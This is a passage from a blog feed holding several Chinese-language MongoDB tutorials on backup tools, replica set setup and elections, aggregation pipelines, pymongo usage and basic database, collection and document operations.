        <content type="html"><![CDATA[<h1 id="MongoDB-全家桶"><a href="#MongoDB-全家桶" class="headerlink" title="MongoDB 全家桶"></a>MongoDB 全家桶</h1><h2 id="MongoDB-全家桶-1"><a href="#MongoDB-全家桶-1" class="headerlink" title="MongoDB 全家桶"></a>MongoDB 全家桶</h2><table><thead><tr><th><strong>软件模块</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>mongod</td><td>MongoDB 数据库软件</td></tr><tr><td>mongo</td><td>MongoDB 命令行工具，管理 MongoDB 数据库</td></tr><tr><td>mongos</td><td>MongoDB 路由进程，分片环境下使用</td></tr><tr><td>mongodump / mongorestore</td><td>命令行数据库备份与恢复工具</td></tr><tr><td>mongoexport / mongoimport</td><td>CSV/JSON 导入与导出，主要用于不同系统间数据迁移</td></tr><tr><td>Compass</td><td>MongoDB GUI 管理工具</td></tr><tr><td>Ops Manager(企业版)</td><td>SQL 解释器 / BI 套接件</td></tr><tr><td>BI Connector(企业版)</td><td>MongoDB 可视化软件</td></tr><tr><td>Atlas (付费及免费)</td><td>MongoDB 云托管服务，包括永久免费云数据库</td></tr></tbody></table><h2 id="Mongodump-mongorestore"><a href="#Mongodump-mongorestore" class="headerlink" title="Mongodump / mongorestore"></a>Mongodump / mongorestore</h2><ul><li>类似于 MySQL 的 dump/restore 工具</li><li>可以完成全库 dump: 不加条件</li><li>也可以根据条件 dump 部分数据: -q 参数</li><li>Dump 的同时跟踪数据就更: –oplog</li><li>Restore 是反操作，把 mongodump 的输出导入到 mongodb</li><li>操作示例：</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 备份数据，-d 数据库 -c 集合</span>mongodump -h 127.0.0.1:27017 -d <span class="token function">test</span> -c <span class="token function">test</span><span class="token comment" spellcheck="true"># 恢复数据，-d 数据库 -c 集合 备份文件</span>mongorestore -h 127.0.0.1:27017 -d <span class="token function">test</span> -c <span class="token function">test</span> xxx.bson<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB副本集模式搭建</title>
      <link href="/post/2cc57599.html"/>
      <url>/post/2cc57599.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-副本集模式搭建"><a href="#MongoDB-副本集模式搭建" class="headerlink" title="MongoDB 副本集模式搭建"></a>MongoDB 副本集模式搭建</h1><h2 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h2><ul><li>安装最新的 MongoDB 版本</li><li>Windows 系统配置好 Mongo 可执行文件的环境变量</li><li>Linux 和 Mac 系统配置好 PATH 变量</li><li>确保有 10GB 以上的硬盘空间</li></ul><h2 id="二、创建数据目录"><a href="#二、创建数据目录" class="headerlink" title="二、创建数据目录"></a>二、创建数据目录</h2><p>MongoDB 启动时将使用一个数据目录存放所有数据文件。<br>需要为 3 个复制节点创建各自的数据目录。</p><p>Linux/MacOS：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /data/db<span class="token punctuation">{</span>1,2,3<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Windows：</p><pre class="line-numbers language-bash"><code class="language-bash">md D:\mongodb\data\db1md D:\mongodb\data\db2md D:\mongodb\data\db3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="三、准备配置文件"><a href="#三、准备配置文件" class="headerlink" title="三、准备配置文件"></a>三、准备配置文件</h2><p>复制集的每个 mongod 进程应该位于不同的服务器。<br>现在在一台机器上运行 3 个进程，因此要为它们各自配置：</p><ul><li>不同的端口。示例将使用 28017/27018/28019</li><li>不同的数据目录。示例中将使用：</li></ul><p>/data/db1<br>/data/db2<br>/data/db3</p><ul><li>不同日志文件路径。示例中将使用：</li></ul><p>/data/db1/mongod.log<br>/data/db2/mongod.log<br>/data/db3/mongod.log<br>配置文件 <strong>/data/db1/mongod.conf</strong>：</p><pre><code>systemLog:  destination: file  path: /data/db1/mongod.log  # log path  logAppend: truestorage:  dbPath: /data/db1  # data directorynet:  bindIp: 0.0.0.0  port: 28017  # portreplication:  replSetName: rs0processManagement:  fork: true</code></pre><p>同上，配置**/data/db2/mongod.conf<strong>和</strong>/data/db3/mongod.conf**</p><h2 id="四、启动停止"><a href="#四、启动停止" class="headerlink" title="四、启动停止"></a>四、启动停止</h2><h3 id="1-启动脚本"><a href="#1-启动脚本" class="headerlink" title="1. 启动脚本"></a>1. 启动脚本</h3><p><strong><em>mongod-start.sh</em></strong></p><pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bashecho -e "\033[31mStart mongod service...\n \033[0m"mongod -f /data/db1/mongod.confmongod -f /data/db2/mongod.confmongod -f /data/db3/mongod.confecho -e "\033[32mmongod service is running.\n \033[0m"# Whether the query is runningps -ef | grep mongod<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-停止脚本"><a href="#2-停止脚本" class="headerlink" title="2. 停止脚本"></a>2. 停止脚本</h3><p><strong><em>mongod-stop.sh</em></strong></p><pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bashpid=`ps -o pid,command ax | grep mongod | awk '!/awk/ && !/grep/ {print $1}'`;if [ "${pid}" != "" ]; then kill -2 ${pid};fiecho -e "\033[31mThe mongod service has stopped. \033[0m"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-添加执行权限并运行"><a href="#3-添加执行权限并运行" class="headerlink" title="3. 添加执行权限并运行"></a>3. 添加执行权限并运行</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chmod</span> +x mongod-start.sh<span class="token function">chmod</span> +x mongod-stop.sh./mongod-start.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="五、配置复制集"><a href="#五、配置复制集" class="headerlink" title="五、配置复制集"></a>五、配置复制集</h2><h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1. 方法一"></a>1. 方法一</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># mongo --port 28017</span><span class="token operator">></span> rs.initiate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> rs.add<span class="token punctuation">(</span><span class="token string">"HOSTNAME:28018"</span><span class="token punctuation">)</span><span class="token operator">></span> rs.add<span class="token punctuation">(</span><span class="token string">"HOSTNAME:28019"</span><span class="token punctuation">)</span><span class="token operator">></span> rs.status<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2. 方法二"></a>2. 方法二</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># mongo --port 28017</span><span class="token operator">></span> rs.initiate<span class="token punctuation">(</span><span class="token punctuation">{</span>    _id: <span class="token string">"rs0"</span>,  members: <span class="token punctuation">[</span><span class="token punctuation">{</span>        _id: 0,        host: <span class="token string">"localhost: 28017"</span>    <span class="token punctuation">}</span>,<span class="token punctuation">{</span>        _id: 1,        host: <span class="token string">"localhost :28018"</span>    <span class="token punctuation">}</span>,<span class="token punctuation">{</span>        _id: 2,        host: <span class="token string">"localhost: 28019"</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">></span> rs.status<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB复制集机制及原理</title>
      <link href="/post/6cec05ac.html"/>
      <url>/post/6cec05ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-复制集机制及原理"><a href="#MongoDB-复制集机制及原理" class="headerlink" title="MongoDB 复制集机制及原理"></a>MongoDB 复制集机制及原理</h1><h2 id="一、复制集的作用"><a href="#一、复制集的作用" class="headerlink" title="一、复制集的作用"></a>一、复制集的作用</h2><ul><li>MongoDB 复制集的主要意义在于实现服务高可用</li><li>它的实现依赖于两个方面的功能：<ul><li>数据写入时将数据迅速复制到另一个独立节点上</li><li>在接受写入的节点发生故障时自动选举出一个新的替代节点</li></ul></li><li>在实现高可用的同时，复制集实现了其它几个附加功能<ul><li>数据分发：将数据从一个区域复制到另一个区域，减少另一个区域的读延迟</li><li>读写分离：不同类型的压力分别在不同的节点上执行</li><li>异地容灾：在数据中心故障的时候快速切换到异地</li></ul></li></ul><h2 id="二、典型复制集结构"><a href="#二、典型复制集结构" class="headerlink" title="二、典型复制集结构"></a>二、典型复制集结构</h2><ul><li>一个典型的复制集由 3 个以上具有投票权的节点组成，包括：<ul><li>一个主节点（PRIMARY）：接受写入操作和选举时投票</li><li>两个（或多个）从节点（SECONDARY）：复制主节点上的新数据和选举时投票</li><li>不推荐使用 Arbiter（投票节点）</li></ul></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619510917766-48e7f21c-989f-4eef-bd3d-88a8b7a528bf.png#clientId=u4108e5ee-cd53-4&amp;from=paste&amp;height=223&amp;id=ucaa20424&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=223&amp;originWidth=395&amp;originalType=binary%E2%88%B6=1&amp;size=25420&amp;status=done&amp;style=none&amp;taskId=u4a0ef6c1-bd0f-4202-b5ce-0ab9125a890&amp;width=395" alt="image.png"></p><h3 id="副本集示例"><a href="#副本集示例" class="headerlink" title="副本集示例"></a>副本集示例</h3><p>下面这张图是一个典型三节点副本集，由一个活跃节点，两个备份节点组成。活跃节点接受所有的写操作，其上数据集的所有变更都会记录到自身的操作日志（oplog）中。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619512782582-6652bdb2-2779-4ca0-a22f-bc1597e7be71.png#clientId=u4108e5ee-cd53-4&amp;from=paste&amp;height=372&amp;id=u56d74fd9&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=428&amp;originWidth=553&amp;originalType=binary%E2%88%B6=1&amp;size=30702&amp;status=done&amp;style=none&amp;taskId=u1f76592e-d092-4e51-894a-030f01ab516&amp;width=481" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619615488506-dc7480cf-844a-4e70-b916-548158a9544e.png#clientId=u4c85ad2b-69e1-4&amp;from=paste&amp;height=373&amp;id=ucf8750ab&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=373&amp;originWidth=602&amp;originalType=binary%E2%88%B6=1&amp;size=27471&amp;status=done&amp;style=none&amp;taskId=uf933f801-18f7-4742-9e53-00df4b48184&amp;width=602" alt="image.png"></p><p>备份节点复制活跃节点的的 oplog，然后将 oplog 的操作应用到自身的数据集上，以达到与活跃节点数据一致的目的，如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619512879330-9d47c248-8ebb-4981-a4c8-373e6bed8936.png#clientId=u4108e5ee-cd53-4&amp;from=paste&amp;height=232&amp;id=u1d37902d&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=293&amp;originWidth=718&amp;originalType=binary%E2%88%B6=1&amp;size=31527&amp;status=done&amp;style=none&amp;taskId=uc42fb473-1365-4a27-8dd2-4bdf40e1101&amp;width=569" alt="image.png"><br>此外，副本集内部节点每 2 秒会相互发送心跳包。</p><h2 id="三、数据是如何复制的？"><a href="#三、数据是如何复制的？" class="headerlink" title="三、数据是如何复制的？"></a>三、数据是如何复制的？</h2><ul><li>当一个修改操作，无论是插入、更新或删除，到达主节点时，它对数据的操作将被记录下来（经过一些必要的转换），这些记录称为 oplog。</li><li>从节点通过在主节点上打开一个 tailable 游标不断获取新进入主节点的 oplog ，并在自己的数据上回放，以此保持跟主节点的数据一致。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619512327214-67b7c6c5-4766-430c-873d-4ed574bed592.png#clientId=u4108e5ee-cd53-4&amp;from=paste&amp;height=242&amp;id=u9f451ca8&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=242&amp;originWidth=643&amp;originalType=binary%E2%88%B6=1&amp;size=31239&amp;status=done&amp;style=none&amp;taskId=ub369996b-a1eb-4b15-9841-f7c258b2085&amp;width=643" alt="image.png"></p><h2 id="四、通过选举完成故障恢复"><a href="#四、通过选举完成故障恢复" class="headerlink" title="四、通过选举完成故障恢复"></a>四、通过选举完成故障恢复</h2><ul><li>具有投票权的节点之间两两互相发送心跳；</li><li>当 5 次心跳未接收时判断为节点失联；</li><li>如果失联的是主节点，从节点会发起选举，选举出新的主节点；</li><li>如果失联的是从节点则不会产生新的选举；</li><li>选举基于 bully 算法实现，选举成功的必要条件是大多数投票节点存活；</li><li>复制集中最多可以有 50 个节点，但是有投票权的节点最多 7 个。</li><li>如果活跃节点不可用，备份节点之间会自动发起选举将其中一个成员升级为新的活跃节点，如下图所示：</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619513203670-6a4e1575-1609-4c36-8db1-9d593ff3e591.png#clientId=u4108e5ee-cd53-4&amp;from=paste&amp;height=379&amp;id=uea81e869&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=379&amp;originWidth=500&amp;originalType=binary%E2%88%B6=1&amp;size=38001&amp;status=done&amp;style=none&amp;taskId=uf735e7be-7cfc-4042-83e4-6084166ffe3&amp;width=500" alt="image.png"></p><ul><li>其特点如下：<ol><li> 触发时机：活跃节点超过 10 秒都没有与其他节点发起心跳。</li><li> 备选节点推选自身为活跃节点，并在大多数节点同意后成为活跃节点。</li><li> 整个过程耗时将近 1 分钟。（发现不可用 10<del>30 秒，选举过程 10</del>30 秒）</li></ol></li></ul><h2 id="五、选举机制"><a href="#五、选举机制" class="headerlink" title="五、选举机制"></a>五、选举机制</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619515403683-d529a042-5a6b-4322-a6b8-0626e546ef7c.png#clientId=u4108e5ee-cd53-4&amp;from=paste&amp;height=666&amp;id=ub27fe45d&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=666&amp;originWidth=765&amp;originalType=binary%E2%88%B6=1&amp;size=270493&amp;status=done&amp;style=none&amp;taskId=u57e102e0-4e00-44ec-ba9f-0dcbe20bf98&amp;width=765" alt="image.png"></p><h2 id="六、影响选举的因素"><a href="#六、影响选举的因素" class="headerlink" title="六、影响选举的因素"></a>六、影响选举的因素</h2><ul><li>整个集群必须有大多数节点存活</li><li>被选举为主节点的节点必须：<ul><li>能够与多数节点建立连接</li><li>具有较新的 oplog</li><li>具有较高的优先级（如果有配置）</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB聚合查询</title>
      <link href="/post/417bc864.html"/>
      <url>/post/417bc864.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-聚合查询"><a href="#MongoDB-聚合查询" class="headerlink" title="MongoDB 聚合查询"></a>MongoDB 聚合查询</h1><h2 id="一、什么是-MongoDB-聚合框架"><a href="#一、什么是-MongoDB-聚合框架" class="headerlink" title="一、什么是 MongoDB 聚合框架"></a>一、什么是 MongoDB 聚合框架</h2><ul><li>MongoDB 聚合框架（Aggregation Framework）是一个计算框架，它可以：<ul><li>作用在一个或几个集合上；</li><li>对集合中的数据进行一系列运算；</li><li>将这些数据转化为期望的形式；</li></ul></li><li>从效果而言，聚合框架相当于 SQL 查询中的：<ul><li>GROUP BY</li><li>LEFT OUTER JOIN</li><li>AS 等</li></ul></li></ul><h2 id="二、管道（Pipeline）和步骤（Stage）"><a href="#二、管道（Pipeline）和步骤（Stage）" class="headerlink" title="二、管道（Pipeline）和步骤（Stage）"></a>二、管道（Pipeline）和步骤（Stage）</h2><ul><li>整个聚合计算过程称为管道（Pipeline），它由多个步骤（Stage）组成，每个管道：<ul><li>接受一系列文档（原始数据）</li><li>每个步骤对这些文档进行一系列运算</li><li>结果文档输出给下一个步骤</li></ul></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619434004581-c4cd5764-51e4-4bfd-ab3f-8bd82ceaa906.png#clientId=u31e27df3-5c0c-4&amp;from=paste&amp;height=106&amp;id=u61bfe8d8&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=106&amp;originWidth=895&amp;originalType=binary%E2%88%B6=1&amp;size=38821&amp;status=done&amp;style=none&amp;taskId=ub72da361-524c-4ad2-9d95-2e0daf5deab&amp;width=895" alt="image.png"></p><h2 id="三、聚合运算基本格式"><a href="#三、聚合运算基本格式" class="headerlink" title="三、聚合运算基本格式"></a>三、聚合运算基本格式</h2><pre class="line-numbers language-plsql"><code class="language-plsql">pipeline = [$stage1, $stage2, ..., $stageN];db.<COLLECTION>.aggregate(    pipeline,  { options });<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、常见步骤"><a href="#四、常见步骤" class="headerlink" title="四、常见步骤"></a>四、常见步骤</h2><table><thead><tr><th><strong>步骤</strong></th><th><strong>作用</strong></th><th><strong>SQL 等价运算符</strong></th></tr></thead><tbody><tr><td>$match</td><td>过滤</td><td>WHERE</td></tr><tr><td>$project</td><td>投影</td><td>AS</td></tr><tr><td>$sort</td><td>排序</td><td>ORDER BY</td></tr><tr><td>$group</td><td>分组</td><td>GROUP BY</td></tr><tr><td>$skip/$limit</td><td>结果限制</td><td>SKIP/LIMIT</td></tr><tr><td>$lookup</td><td>左外连接</td><td>LEFT OUTER JOIN</td></tr><tr><td>$unwind</td><td>展开数组</td><td>N/A</td></tr><tr><td>$graphLookup</td><td>图搜索</td><td>N/A</td></tr><tr><td>$facet/$buket</td><td>分片搜索</td><td>N/A</td></tr></tbody></table><h2 id="五、聚合运算的使用场景"><a href="#五、聚合运算的使用场景" class="headerlink" title="五、聚合运算的使用场景"></a>五、聚合运算的使用场景</h2><ul><li>聚合查询可以用于 OLAP 和 OLTP 场景。例如：<table><thead><tr><th><strong>OLTP</strong></th><th><strong>OLAP</strong></th></tr></thead><tbody><tr><td>计算</td><td>分析一段时间内的销售总额、均值</td></tr><tr><td></td><td>计算一段时间内的净利润</td></tr><tr><td></td><td>分析购买人的年龄分布</td></tr><tr><td></td><td>分析学生成绩分布</td></tr><tr><td></td><td>统计员工绩效</td></tr></tbody></table></li></ul><h2 id="六、MQL-常用步骤与-SQL-对比"><a href="#六、MQL-常用步骤与-SQL-对比" class="headerlink" title="六、MQL 常用步骤与 SQL 对比"></a>六、MQL 常用步骤与 SQL 对比</h2><ul><li>SQL</li></ul><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    FIRST_ NAME <span class="token keyword">AS</span> <span class="token punctuation">`</span>名<span class="token punctuation">`</span><span class="token punctuation">,</span>    LAST_ NAME <span class="token keyword">AS</span> <span class="token punctuation">`</span>姓<span class="token punctuation">`</span><span class="token keyword">FROM</span> Users<span class="token keyword">WHERE</span> GENDER <span class="token operator">=</span> <span class="token string">'男'</span>SKIP <span class="token number">100</span><span class="token keyword">LIMIT</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>MQL</li></ul><pre class="line-numbers language-plsql"><code class="language-plsql">db.users.aggregate([    {$match: {gender: "男"}},    {$skip: 100},    {$limit: 20},    {$project: {        '名': '$first_ name',        '姓': '$last_ name'     }} });<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB程序开发-Python</title>
      <link href="/post/ab9d171d.html"/>
      <url>/post/ab9d171d.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-程序开发-Python"><a href="#MongoDB-程序开发-Python" class="headerlink" title="MongoDB 程序开发-Python"></a>MongoDB 程序开发-Python</h1><h2 id="一、安装-Python-MongoDB-驱动程序"><a href="#一、安装-Python-MongoDB-驱动程序" class="headerlink" title="一、安装 Python MongoDB 驱动程序"></a>一、安装 Python MongoDB 驱动程序</h2><ul><li>安装 MongoDB 驱动</li></ul><pre class="line-numbers language-bash"><code class="language-bash">pip3 <span class="token function">install</span> pymongo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>检查驱动程序</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> pymongopymongo<span class="token punctuation">.</span>version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="二、创建连接"><a href="#二、创建连接" class="headerlink" title="二、创建连接"></a>二、创建连接</h2><ul><li>MongoDB 连接字符串：<strong>mongodb://<host>:<port></port></host></strong></li><li>初始化数据库连接：</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pymongo <span class="token keyword">import</span> MongoClienturi <span class="token operator">=</span> <span class="token string">"mongodb://127.0.0.1:17017"</span>client <span class="token operator">=</span> MongoClient<span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、插入数据"><a href="#三、插入数据" class="headerlink" title="三、插入数据"></a>三、插入数据</h2><ul><li>初始化数据库和集合</li></ul><pre class="line-numbers language-python"><code class="language-python">db <span class="token operator">=</span> client<span class="token punctuation">[</span><span class="token string">"eshop"</span><span class="token punctuation">]</span>user_coll <span class="token operator">=</span> db<span class="token punctuation">[</span><span class="token string">"users"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>插入一条新的用户数据</li></ul><pre class="line-numbers language-python"><code class="language-python">new_user <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"nina"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"123456@qq.com"</span><span class="token punctuation">}</span>result <span class="token operator">=</span> user_coll<span class="token punctuation">.</span>insert_one<span class="token punctuation">(</span>new_user<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注：我们并没有提前创建数据库和表/集合</p></blockquote><h2 id="四、更新数据"><a href="#四、更新数据" class="headerlink" title="四、更新数据"></a>四、更新数据</h2><ul><li>需求变化，要求修改用户属性，增加字段 phone</li></ul><pre class="line-numbers language-python"><code class="language-python">result <span class="token operator">=</span> user_coll<span class="token punctuation">.</span>update_one<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"nina"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                             <span class="token punctuation">{</span><span class="token string">"$set"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"phone"</span><span class="token punctuation">:</span> <span class="token string">"123456789"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注：我们并没有去数据库修改表结构</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB基本操作</title>
      <link href="/post/2920ef5e.html"/>
      <url>/post/2920ef5e.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-基本操作"><a href="#MongoDB-基本操作" class="headerlink" title="MongoDB 基本操作"></a>MongoDB 基本操作</h1><h2 id="一、数据库操作"><a href="#一、数据库操作" class="headerlink" title="一、数据库操作"></a>一、数据库操作</h2><h3 id="创建-使用-use-创建数据库"><a href="#创建-使用-use-创建数据库" class="headerlink" title="创建 - 使用 use 创建数据库"></a>创建 - 使用 use 创建数据库</h3><ul><li>使用 <strong>use DATABASE_NAME</strong> 来创建数据库</li><li>示例：</li></ul><pre class="line-numbers language-plsql"><code class="language-plsql">> use testswitched to db test> dbtest><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看-查看所有数据库"><a href="#查看-查看所有数据库" class="headerlink" title="查看 - 查看所有数据库"></a>查看 - 查看所有数据库</h3><ul><li>使用 <strong>show dbs</strong> 命令查看所有数据库</li></ul><h3 id="删除-使用-dropDatabase-删除数据库"><a href="#删除-使用-dropDatabase-删除数据库" class="headerlink" title="删除 - 使用 dropDatabase 删除数据库"></a>删除 - 使用 dropDatabase 删除数据库</h3><ul><li>使用 <strong>db.dropDatabase()</strong> 来删除数据库</li><li>数据相应文件也会被删除，磁盘空间被释放</li></ul><h2 id="二、集合操作"><a href="#二、集合操作" class="headerlink" title="二、集合操作"></a>二、集合操作</h2><h3 id="创建-使用-createCollection-创建集合"><a href="#创建-使用-createCollection-创建集合" class="headerlink" title="创建 - 使用 createCollection 创建集合"></a>创建 - 使用 createCollection 创建集合</h3><ul><li>语法格式：<strong>db.createCollection(name, options)</strong></li><li>name: 要创建的集合名称</li><li>options: 可选参数, 指定有关内存大小及索引的选项</li><li>options 可以是以下参数：<table><thead><tr><th><strong>字段</strong></th><th><strong>类型</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>capped</td><td>布尔</td><td>（可选）如果为 true，则创建固定集合。固定集合是指有着固定大小的集合，当达到最大值时，它会自动覆盖最早的文档。当该值为 true 时，必须指定 size 参数。</td></tr><tr><td>autoIndexId</td><td>布尔</td><td>3.2 之后不再支持该参数。（可选）如为 true，自动在 _id 字段创建索引。默认为 false。</td></tr><tr><td>size</td><td>数值</td><td>（可选）为固定集合指定一个最大值，即字节数。如果 capped 为 true，也需要指定该字段。</td></tr><tr><td>max</td><td>数值</td><td>（可选）指定固定集合中包含文档的最大数量。</td></tr></tbody></table></li></ul><h3 id="查询-查询数据库中的集合"><a href="#查询-查询数据库中的集合" class="headerlink" title="查询 - 查询数据库中的集合"></a>查询 - 查询数据库中的集合</h3><ul><li>查询语句：<strong>show collections / show tables</strong></li></ul><h3 id="重命名-使用-renameCollection-重命名集合"><a href="#重命名-使用-renameCollection-重命名集合" class="headerlink" title="重命名 - 使用 renameCollection 重命名集合"></a>重命名 - 使用 renameCollection 重命名集合</h3><ul><li>语法格式：<strong>db.COLLECTION_NAME.renameCollection(“NEW_NAME”)</strong></li></ul><h3 id="删除-使用-drop-删除集合"><a href="#删除-使用-drop-删除集合" class="headerlink" title="删除 - 使用 drop 删除集合"></a>删除 - 使用 drop 删除集合</h3><ul><li>使用 **db.&lt;集合&gt;.drop()**来删除一个集合</li><li>集合中的全部文档都会被删除</li><li>集合相关的索引也会被删除</li><li>示例：db.colToBeDropped.drop()</li></ul><h2 id="三、文档操作"><a href="#三、文档操作" class="headerlink" title="三、文档操作"></a>三、文档操作</h2><h3 id="插入-使用-insert-完成插入操作"><a href="#插入-使用-insert-完成插入操作" class="headerlink" title="插入 - 使用 insert 完成插入操作"></a>插入 - 使用 insert 完成插入操作</h3><p>操作格式：</p><ul><li>db.<strong>&lt;集合&gt;</strong>.insertOne(<strong>&lt;JSON 对象&gt;</strong>)</li><li>db.<strong>&lt;集合&gt;</strong>.insertMany([<strong>&lt;JSON 1&gt;, &lt;JSON 2&gt;, &lt;JSON 3&gt;, …, <json n=""></json></strong>])</li></ul><p>示例：</p><pre class="line-numbers language-plsql"><code class="language-plsql">db.fruit.insertOne({name: "apple"})db.fruit.insertMany([    {name: "apple"},  {name: "pear"},  {name: "orange"}])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查询-使用-find-查询文档"><a href="#查询-使用-find-查询文档" class="headerlink" title="查询 - 使用 find 查询文档"></a>查询 - 使用 find 查询文档</h3><ul><li>关于 find：<ul><li>find 是 MongoDB 中查询数据的基本指令，相当于 SQL 中的 SELECT。</li><li>find 返回的是游标</li></ul></li><li>find 示例：</li></ul><pre class="line-numbers language-plsql"><code class="language-plsql">db.movies.find({"year": 1975}) // 单条件查询db.movies.find({"year": 1989, "title": "Batman"}) // 多条件and查询db.movies.find({$and: [{"title": "Batman"}, {"category": "action"}]})  // and的另一种形式db.movies.find({$or: [{"year": 1989}, {"title": "Beaman"}]}) // 多条件or查询db.movies.find({"title": /^B/}}) // 按正则表达式查找<span aria-hidden="true" 